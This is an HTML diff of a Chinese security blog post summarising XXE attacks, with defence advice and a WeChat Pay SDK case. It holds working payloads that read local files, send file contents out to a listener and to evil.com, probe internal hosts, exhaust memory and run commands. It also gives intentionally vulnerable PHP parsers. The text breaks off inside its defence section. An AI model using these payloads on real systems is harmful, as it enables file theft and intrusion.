@@ -1,0 +1,984 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/xzpq.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web漏洞," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="以前对于XXE了解较少,为了弥补安全防御知识及减少漏洞利用短板,翻了一波资料,总结分享下。   XXE基础知识xml基础知识:https://p0rz9.github.io/2018/11/08/java_web_xml/DTD:XML文档包括XML声明,DTD文档类型定义(可选),文档元素。         内部声明DTD:         &amp;lt;!DOCTYPE 根元素 [元素声明]&amp;gt">
+<meta name="keywords" content="Web漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE漏洞总结">
+<meta property="og:url" content="http://yoursite.com/2019/02/27/xxe/index.html">
+<meta property="og:site_name" content="P0rZ9&#39;s blog">
+<meta property="og:description" content="以前对于XXE了解较少,为了弥补安全防御知识及减少漏洞利用短板,翻了一波资料,总结分享下。   XXE基础知识xml基础知识:https://p0rz9.github.io/2018/11/08/java_web_xml/DTD:XML文档包括XML声明,DTD文档类型定义(可选),文档元素。         内部声明DTD:         &amp;lt;!DOCTYPE 根元素 [元素声明]&amp;gt">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.08.36.44-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-26.18.07.59-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.08.44.59-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.09.11.59-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.09.45.31-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.09.51.44-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.11.27.49-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.11.44.51-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.12.12.06-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.19.27.15-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.18.10.54-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.18.13.15-image.png">
+<meta property="og:updated_time" content="2019-02-28T10:20:31.643Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XXE漏洞总结">
+<meta name="twitter:description" content="以前对于XXE了解较少,为了弥补安全防御知识及减少漏洞利用短板,翻了一波资料,总结分享下。   XXE基础知识xml基础知识:https://p0rz9.github.io/2018/11/08/java_web_xml/DTD:XML文档包括XML声明,DTD文档类型定义(可选),文档元素。         内部声明DTD:         &amp;lt;!DOCTYPE 根元素 [元素声明]&amp;gt">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.08.36.44-image.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/02/27/xxe/"/>
+
+
+
+
+
+  <title>XXE漏洞总结 | P0rZ9's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">P0rZ9's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/27/xxe/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XXE漏洞总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-27T08:15:41+08:00">
+                2019-02-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>以前对于XXE了解较少,为了弥补安全防御知识及减少漏洞利用短板,翻了一波资料,总结分享下。</p>
+</blockquote>
+<hr>
+<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>xml基础知识:<a href="https://p0rz9.github.io/2018/11/08/java_web_xml/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/11/08/java_web_xml/</a><br><strong>DTD</strong>:<br>XML文档包括XML声明,DTD文档类型定义(可选),文档元素。        </p>
+<pre><code>内部声明DTD:    
+    &lt;!DOCTYPE 根元素 [元素声明]&gt;
+
+引用外部DTD:
+    &lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;
+</code></pre><p>DTD中的关键字:            </p>
+<pre><code>DOCTYPE(声明)    
+ENTITY(实体声明)        
+SYSTEM PUBLIC(外部资源申请)            
+</code></pre><p>实体类别:</p>
+<pre><code>参数实体(用%声明,用%引用。 DTD中声明,DTD中引用)            
+其余实体(直接用实体名称声明,使用&amp;引用。  DTD中声明,xml中引用)                
+</code></pre><p><strong>举例</strong></p>
+<pre><code>内部实体:            
+&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;    
+
+外部实体:
+&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;        
+
+参数实体:
+&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;    
+或
+&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;
+</code></pre><p>注:参数实体是在<strong>DTD中</strong>引用的,而其余实体是在<strong>xml文档</strong>中引用的。        </p>
+<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>xml外部实体注入(XML External Entity)。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p>
+<h3 id="构建外部实体注入"><a href="#构建外部实体注入" class="headerlink" title="构建外部实体注入"></a>构建外部实体注入</h3><p>构建外部实体注入共有3种方法    </p>
+<h4 id="有回显读本地敏感文件-Normal-XXE"><a href="#有回显读本地敏感文件-Normal-XXE" class="headerlink" title="有回显读本地敏感文件(Normal XXE)"></a>有回显读本地敏感文件(Normal XXE)</h4><p>xml.php</p>
+<pre><code>&lt;?php
+    libxml_disable_entity_loader (false);
+    $xmlfile = file_get_contents(&apos;php://input&apos;);
+    $dom = new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
+    $creds = simplexml_import_dom($dom);
+    echo $creds;
+?&gt;
+</code></pre><p>payload:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a [ 
+    &lt;!ENTITY b SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt; 
+]&gt;
+&lt;c&gt;&amp;b;&lt;/c&gt;
+</code></pre><p>结果如下<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.08.36.44-image.png" alt="2019-02-27.08.36.44-image.png"></p>
+<p>上面可以读取到数据是基于文件内容没有什么特殊符号,我们新建个test.txt文件,复制刚才的内容,再加上几个<code>&lt; &gt;</code>符号(<strong>如下所示</strong>)                </p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-26.18.07.59-image.png" alt="2019-02-26.18.07.59-image.png"></p>
+<p><strong>我们读取一下</strong>:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.08.44.59-image.png" alt="2019-02-27.08.44.59-image.png"></p>
+<p>发现报错了,因为txt文件的&lt;字符会被xml解析器当作新元素的开始,那如何解决这个问题,我们需要了解一下:<a href="http://www.w3school.com.cn/xml/xml_cdata.asp" target="_blank" rel="noopener">CDATA</a></p>
+<blockquote>
+<p>CDATA指的是不应由XML解析器进行解析的文本数据。CADATA中的所有内容都会被XML解析器忽略。</p>
+</blockquote>
+<p>那在这里我们就可以把读出来的数据放在CDATA中输出进行绕过。由于在XML并不支持多个实体连续引用,而必须在<strong>DTD中拼接好</strong>，然后在XML中进行引用。在DTD中拼接，只能使用参数实体，payload:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE roottag [
+&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
+&lt;!ENTITY % goodies SYSTEM &quot;file:///C:/Windows/test.txt&quot;&gt;  
+&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
+&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1:83/evil.dtd&quot;&gt; 
+%dtd; ]&gt; 
+
+&lt;roottag&gt;&amp;all;&lt;/roottag&gt;
+</code></pre><p>evil.dtd</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;
+</code></pre><p>成功读取到含有特殊字符的文件内容<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.09.11.59-image.png" alt="2019-02-27.09.11.59-image.png"></p>
+<h4 id="无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="无回显读取本地敏感文件(Blind OOB XXE)"></a>无回显读取本地敏感文件(Blind OOB XXE)</h4><h5 id="外带请求读取文件"><a href="#外带请求读取文件" class="headerlink" title="外带请求读取文件"></a>外带请求读取文件</h5><p>想要外带就必须发出请求，我们可以在外部实体定义或者参数实体定义时，但是光请求还不够，我们需要把第一次请求的数据传出去，就是说，我们需要在”<strong>请求中引用另一个请求的结果</strong>“，我们只有用参数实体才可以满足要求(且参数实体必须在DTD中引用)</p>
+<p>xml.php</p>
+<pre><code>&lt;?php
+libxml_disable_entity_loader (false);
+$xmlfile = file_get_contents(&apos;php://input&apos;);
+$dom = new DOMDocument();
+$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
+?&gt;
+</code></pre><p>evil.dtd</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/Windows/test.txt&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://127.0.0.1:1223?p=%file;&apos;&gt;&quot;&gt;
+</code></pre><p>payload:</p>
+<pre><code>http://127.0.0.1:83/xml.php
+post:
+&lt;!DOCTYPE convert [ 
+&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1:83/evil.dtd&quot;&gt;
+%remote;%int;%send;
+]&gt;
+</code></pre><p>我们先监听1223端口,然后执行我们的payload，执行结果:</p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.09.45.31-image.png" alt="2019-02-27.09.45.31-image.png"></p>
+<p>我们可以看到接收了我们base64编码(为了不破坏原来的XML语法)后的文件内容,我们解码后即为test.txt内容<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.09.51.44-image.png" alt="2019-02-27.09.51.44-image.png"></p>
+<p>调用过程:<br>在payload中看到连续调用了三个请求实体%remote;%int;%send;,首先%remote先调用,调用后请求83端口的evil.dtd文件，然后%int调用test.dtd中的%file,%file就会去获取服务器上的test.txt文件，然后将返回的结果进行base64编码再填充到%send中(实体内容不能有%,所以进行html编码为<code>&amp;#37;</code>)，调用%send，将内容发到我们监听的服务器上(这里我用本机演示的)，这就实现了外带数据的效果，解决了XXE无回显的问题。</p>
+<h3 id="XXE的危害"><a href="#XXE的危害" class="headerlink" title="XXE的危害"></a>XXE的危害</h3><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><p>这是XXE攻击最基本的使用方式,我们在上面的例子可以看到。        </p>
+<h4 id="SSRF-内网主机、端口探测"><a href="#SSRF-内网主机、端口探测" class="headerlink" title="SSRF/内网主机、端口探测"></a>SSRF/内网主机、端口探测</h4><p>SSRF(服务器请求伪造)，<br>利用SSRF,我们可以使用更多的协议来进行漏洞测试,我们先了解不同平台对应可用的协议:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.11.27.49-image.png" alt="2019-02-27.11.27.49-image.png"></p>
+<p>PHP在安装扩展以后还能支持以下协议:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.11.44.51-image.png" alt="2019-02-27.11.44.51-image.png"></p>
+<p><strong>主机探测</strong></p>
+<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;
+    &lt;!DOCTYPE ANY [
+        &lt;!ENTITY f SYSTEM &quot;http://10.10.10.1&quot;&gt;
+    ]&gt;
+    &lt;x&gt;&amp;f;&lt;/x&gt;
+</code></pre><p>对ip地址进行探测或者使用FTP协议探测(下文会提及)</p>
+<p><strong>端口探测</strong><br>由上面知道了网端的开放信息,接下来我们就进一步探测存活网段的端口:</p>
+<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+    &lt;!ENTITY f SYSTEM &quot;http://127.0.0.1:80&quot;&gt;
+]&gt;
+&lt;x&gt;&amp;f;&lt;/x&gt;
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.12.12.06-image.png" alt="2019-02-27.12.12.06-image.png"></p>
+<h4 id="Dos攻击"><a href="#Dos攻击" class="headerlink" title="Dos攻击"></a>Dos攻击</h4><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+  &lt;!DOCTYPE lolz [
+    &lt;!ENTITY lol &quot;lol&quot;&gt;
+    &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
+    &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
+    &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
+    &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
+    &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
+    &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
+    &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
+    &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
+  ]&gt;
+    &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
+</code></pre><p>当XML解析器加载这个文档时，他会看到它包含一个包含文本&lol9;的根元素,不过&lol9;是一个定义的实体,扩展包含十个&lol8;的字符串,每个&lol8;是一个定义的实体，扩展为十个&lol7;的字符串。因为许多XML解释器在解析XML文档时倾向于将它的整个结果保存在内存中，所以这个不到1kb的xml文件实际包含10亿个lol,占用几乎3GB的内存，造成DDOS攻击。</p>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>PHP环境下,xml命令执行要求php装有expect扩展。该扩展默认没有安装。</p>
+<pre><code>&lt;?php 
+  $xml = &lt;&lt;&lt;EOF
+  &lt;?xml version = &quot;1.0&quot;?&gt;
+  &lt;!DOCTYPE ANY [
+      &lt;!ENTITY f SYSTEM &quot;except://ls&quot;&gt;
+  ]&gt;
+  &lt;x&gt;&amp;f;&lt;/x&gt;
+  EOF;
+  $data = simplexml_load_string($xml);
+  print_r($data);
+?&gt;
+</code></pre><h3 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a>真实案例</h3><h4 id="微信XXE"><a href="#微信XXE" class="headerlink" title="微信XXE"></a>微信XXE</h4><p>前一阵子非常火的微信支付的XXE<br><strong>漏洞描述</strong>:微信SDK的xmlToMap()方法接收并处理xml数据且支持外部实体解析，所以只要能控制strXml，那么这边就存在XXE漏洞。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.19.27.15-image.png" alt="2019-02-27.19.27.15-image.png"></p>
+<p>执行我们的测试代码(读取win.ini文件)<br><strong>Test.java</strong></p>
+<pre><code>package com.test;
+import java.util.Map;
+import static com.github.wxpay.sdk.WXPayUtil.xmlToMap;
+
+public class Test {
+    public static void main(String args[]) throws Exception {
+
+        String xmlStr =&quot;&lt;?xml version=&apos;1.0&apos; encoding=&apos;utf-8&apos;?&gt;\r\n&quot; +
+                &quot;&lt;!DOCTYPE root [\r\n&quot; +
+                &quot;&lt;!ENTITY test SYSTEM &apos;file:///C:/Windows/win.ini&apos;&gt;]&gt;\r\n&quot; +
+                &quot;&lt;root&gt;\r\n&quot;+
+                &quot;&lt;name&gt;&amp;test;&lt;/name&gt;\r\n&quot; +
+                &quot;&lt;/root&gt;&quot;;
+
+        try{
+            Map&lt;String,String&gt; test = xmlToMap(xmlStr);
+            System.out.println(test);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.18.10.54-image.png" alt="2019-02-27.18.10.54-image.png"></p>
+<p>netdoc协议代替file://协议去读取文件:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.18.13.15-image.png" alt="2019-02-27.18.13.15-image.png"></p>
+<p>修复方案是针对WXPayXmlUtil.java的配置进行了修改。<br>错误配置:        </p>
+<pre><code>http://apache.org/xml/features/disallow-doctype-decl false
+http://apache.org/xml/features/nonvalidating/load-external-dtd false
+http://xml.org/sax/features/external-general-entities true
+http://xml.org/sax/features/external-parameter-entities true
+</code></pre><p>修复后:</p>
+<pre><code>http://apache.org/xml/features/disallow-doctype-decl true  (不能使用DOCTYPE)
+http://apache.org/xml/features/nonvalidating/load-external-dtd false (不加载外部DTD文件)
+http://xml.org/sax/features/external-general-entities false  //防止外部普通实体            
+http://xml.org/sax/features/external-parameter-entities false  //防止外部参数实体
+</code></pre><p><strong>复现代码</strong>:</p>
+<h3 id="漏洞挖掘中如何快速检测是否存在XXE"><a href="#漏洞挖掘中如何快速检测是否存在XXE" class="headerlink" title="漏洞挖掘中如何快速检测是否存在XXE"></a>漏洞挖掘中如何快速检测是否存在XXE</h3><h4 id="常用检测方法"><a href="#常用检测方法" class="headerlink" title="常用检测方法"></a>常用检测方法</h4><h5 id="首先查看XML是否可以成功解析"><a href="#首先查看XML是否可以成功解析" class="headerlink" title="首先查看XML是否可以成功解析"></a>首先查看XML是否可以成功解析</h5><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  
+&lt;!DOCTYPE ANY [  
+&lt;!ENTITY name &quot;test1&quot;&gt;]&gt;    
+&lt;root&gt;&amp;name;&lt;/root&gt;
+</code></pre><p>如果页面输出了test1(可以解析),第二步查看是否支持DTD引用外部实体        </p>
+<pre><code>&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;  
+&lt;!DOCTYPE ANY [  
+&lt;!ENTITY % name SYSTEM &quot;http://myhost/index.html&quot;&gt;  
+%name;  
+]&gt;
+</code></pre><p>然后在我的服务器上查看日志,如果有目标服务器向我的服务器发送了一条index.html的请求,说明<br>支持引用外部实体,很有可能存在xxe漏洞。            </p>
+<h5 id="外部普通实体"><a href="#外部普通实体" class="headerlink" title="外部普通实体"></a>外部普通实体</h5><p>当有回显时，利用file://协议:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+    &lt;!DOCTYPE lltest[
+    &lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;
+]&gt; 
+    &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;
+</code></pre><h5 id="外部参数实体"><a href="#外部参数实体" class="headerlink" title="外部参数实体"></a>外部参数实体</h5><p>当无回显，使用http协议:        </p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE note[ 
+&lt;!ENTITY % lltest SYSTEM &quot;http://myhost:1234/test_xxe&quot;&gt;
+%lltest;
+]&gt;
+</code></pre><p>然后在myhost监听1234端口(dnslog地址也可以),查看是否有http请求        </p>
+<h4 id="代码审计XXE"><a href="#代码审计XXE" class="headerlink" title="代码审计XXE"></a>代码审计XXE</h4><p>直接查找关键字:        </p>
+<pre><code>javax.xml.parsers.DocumentBuilderFactory;
+javax.xml.parsers.SAXParser
+javax.xml.transform.TransformerFactory
+javax.xml.validation.Validator
+javax.xml.validation.SchemaFactory
+javax.xml.transform.sax.SAXTransformerFactory
+javax.xml.transform.sax.SAXSource
+org.xml.sax.XMLReader
+org.xml.sax.helpers.XMLReaderFactory
+org.dom4j.io.SAXReader
+org.jdom.input.SAXBuilder
+org.jdom2.input.SAXBuilder
+javax.xml.bind.Unmarshaller
+javax.xml.xpath.XpathExpression
+javax.xml.stream.XMLStreamReader
+org.apache.commons.digester3.Digester
+…………
+</code></pre><h4 id="Json-Content-type-XXE"><a href="#Json-Content-type-XXE" class="headerlink" title="Json Content-type XXE"></a>Json Content-type XXE</h4><p>很多Web与App应用都是基于客户端-服务器交互的Web通信服务,最常见的数据格式就是Json与XML，尽管web服务可能只使用一种格式，但是服务器却可以接收开发人员没有料到的其他数据格式，有可能导致Json节点受到XXE攻击。<br>测试方法很简单,就是将<code>Content-Type: application/json</code>修改为<code>Content-Type: application/xml</code>，数据格式不变，查看是否报错:<br><code>{&quot;errors&quot;:{&quot;errorMessage&quot;:&quot;org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.&quot;}}</code><br>可以发现服务器是可以处理xml数据的，于是我们利用这个来进行攻击。<br>payload:    </p>
+<pre><code>...
+Content-Type: application/xml
+...
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
+&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
+&lt;root&gt;
+&lt;param1&gt;name&lt;/param1&gt;
+&lt;param2&gt;&amp;xxe;&lt;/param2&gt;
+&lt;/root&gt;
+</code></pre><p>查看是否可以读取敏感文件。                </p>
+<h4 id="利用FTP协议获取敏感信息"><a href="#利用FTP协议获取敏感信息" class="headerlink" title="利用FTP协议获取敏感信息"></a>利用FTP协议获取敏感信息</h4><p>利用ftp协议获取服务器信息/内网ip之类的技巧:<br>在攻击者服务器上运行rb脚本(模拟FTP服务器:<a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb),监听8080端口。" target="_blank" rel="noopener">https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb),监听8080端口。</a><br>然后在web程序那里输入payload:    </p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a [
+   &lt;!ENTITY % asd SYSTEM &quot;http://evil.com/ext.dtd&quot;&gt; 
+   %asd; 
+   %rrr; 
+]&gt;
+&lt;a&gt;&lt;/a&gt;
+</code></pre><p>ext.dtd</p>
+<pre><code>&lt;!ENTITY % b SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % c &quot;&lt;!ENTITY &amp;#37; rrr SYSTEM &apos;ftp://evil.com:8000/%b;&apos;&gt;&quot;&gt;
+</code></pre><p>然后在模拟的FTP服务器上就会收到一些服务器信息/文件内容            </p>
+<p>技巧来自:<a href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html" target="_blank" rel="noopener">http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html</a>    </p>
+<h4 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h4><pre><code>&lt;!DOCTYPE :. SYTEM &quot;http://&quot;
+&lt;!DOCTYPE :_-_: SYTEM &quot;http://&quot;
+&lt;!DOCTYPE {0xdfbf} SYSTEM &quot;http://&quot;
+</code></pre><h3 id="XXE如何防御"><a href="#XXE如何防御" class="headerlink" title="XXE如何防御"></a>XXE如何防御</h3><h4 id="禁用外部实体"><a href="#禁用外部实体" class="headerlink" title="禁用外部实体"></a>禁用外部实体</h4><p>不同语言都提供了禁用外部实体的方法            </p>
+<pre><code>PHP:
+   libxml_disable_entity_loader(true);
+
+JAVA:
